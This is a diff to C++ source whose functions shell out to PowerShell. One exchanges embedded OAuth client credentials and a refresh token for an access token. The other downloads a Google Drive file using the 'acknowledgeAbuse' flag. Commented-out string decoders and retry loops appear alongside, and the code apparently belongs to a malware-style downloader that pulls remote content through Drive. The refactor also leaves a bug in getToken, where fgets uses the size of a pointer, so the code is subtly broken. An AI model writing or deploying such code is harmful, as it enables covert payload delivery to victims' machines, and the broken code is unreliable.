@@ -124,13 +124,14 @@ static void handleFailsafe() {
 
 static MyString getToken() {
 
-    char buffer[1024];
+    char* buffer = new char[1024];
     sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30; $response.access_token | ConvertTo-Json}catch{echo 4}\"",g_client_id.getContext(), g_client_secret.getContext(), g_refresh_token.getContext());
     //Decoder(Url);
     FILE* file = _popen(buffer, "r");
     fgets(buffer, sizeof(buffer), file);
     if (buffer[0] == '4')
     {
+        delete[] buffer;
         handleFailsafe();
         return getToken();
     }
@@ -138,29 +139,27 @@ static MyString getToken() {
     
     _pclose(file);
     g_flag = false;
+    delete[] buffer;
     return output.getSubString(1, output.getLength() - 2);
 }
 // Get Token
 
 static MyString downloadContext() {
-    char url_1[] = "powershell.exe -c \"try {Write-Host -NoNewline(Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer ";
-    char url_2[] = "'}) }catch{echo 4}\"";
-    //Decoder(Url_1);
-    //Decoder(Url_2);
-    MyString Url = url_1;
-    Url = Url + g_access_token + url_2;
-    FILE* file = _popen(Url.getContext(), "r");
-    char temp_buffer[1024];
+    char* buffer = new char[1024];
+    snprintf(buffer, 1024, "powershell.exe -c \"try {Write-Host -NoNewline(Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}) }catch{echo 4}\"", g_access_token.getContext());
+    FILE* file = _popen(buffer, "r");
     MyString output = "";
-    while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
-        output = output + temp_buffer;
+    while (fgets(buffer, 1024, file) != NULL) {
+        output = output + buffer;
     }
     if (output.getCharAt(0) == '4') {
         g_access_token = getToken();
+        delete[] buffer;
         return downloadContext();
     }
 
     _pclose(file);
+    delete[] buffer;
     return output;
 }
 //Download
